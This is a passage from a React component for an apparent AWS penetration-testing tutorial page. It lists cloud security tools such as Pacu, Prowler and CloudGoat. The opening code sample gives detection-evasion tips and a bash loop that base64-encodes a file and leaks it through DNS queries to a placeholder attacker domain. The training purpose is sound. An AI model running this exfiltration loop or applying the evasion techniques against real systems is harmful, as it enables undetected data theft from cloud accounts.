aws cloudtrail describe-trails

# Check GuardDuty status
aws guardduty list-detectors

# Techniques to evade detection:
# 1. Operate within "normal" usage patterns
# 2. Use legitimate AWS services for data movement
# 3. Use regions with less monitoring
# 4. Use temporary sessions with shorter lifespans
# 5. Operate during business hours when legitimate activity is higher

# Test DNS exfiltration (low and slow)
# Create script to encode data and exfiltrate via DNS queries
# Example: Using dig to make DNS requests with encoded data
for chunk in $(cat sensitive-data.txt | base64 | fold -w 30); do
  dig $chunk.exfil.attacker-domain.com
  sleep 5
done`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
          </TabsContent>
          
          <TabsContent value="tools" className="space-y-6 mt-6">
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Essential AWS Penetration Testing Tools</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-xl font-bold mb-2">Pacu</h4>
                  <p className="mb-2">An open-source AWS exploitation framework designed for testing the security of AWS environments.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Modular architecture with various attack modules</li>
                      <li>Enumeration of AWS resources and services</li>
                      <li>Privilege escalation scanning</li>
                      <li>Credential harvesting capabilities</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">ScoutSuite</h4>
                  <p className="mb-2">Multi-cloud security auditing tool that provides detailed security findings.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Comprehensive AWS service coverage</li>
                      <li>Detailed reporting with security findings</li>
                      <li>Rules-based assessment approach</li>
                      <li>Web-based reporting dashboard</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">CloudGoat</h4>
                  <p className="mb-2">"Vulnerable by Design" AWS deployment tool for practicing cloud security techniques.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Realistic AWS security scenarios</li>
                      <li>Hands-on learning for AWS attacks</li>
                      <li>Various difficulty levels and scenarios</li>
                      <li>Automated deployment and teardown</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">S3Scanner</h4>
                  <p className="mb-2">Tool for finding open S3 buckets and enumerating their contents.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Fast scanning of many buckets</li>
                      <li>Content enumeration capabilities</li>
                      <li>Permission checking for buckets</li>
                      <li>Output in various formats</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">Prowler</h4>
                  <p className="mb-2">Command line tool for AWS security assessment, auditing and hardening.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Based on CIS AWS Foundations Benchmark</li>
                      <li>Over 100 security checks</li>
                      <li>Detailed findings with remediation guidance</li>
                      <li>Supports custom security checks</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">AWS CLI</h4>
                  <p className="mb-2">Official command-line interface for AWS, essential for penetration testing.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Complete API coverage for all AWS services</li>
                      <li>Scriptable for automated testing</li>
                      <li>Profile support for multiple accounts</li>
                      <li>JSON output for programmatic processing</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </section>
  );
};

export default AWSSection;
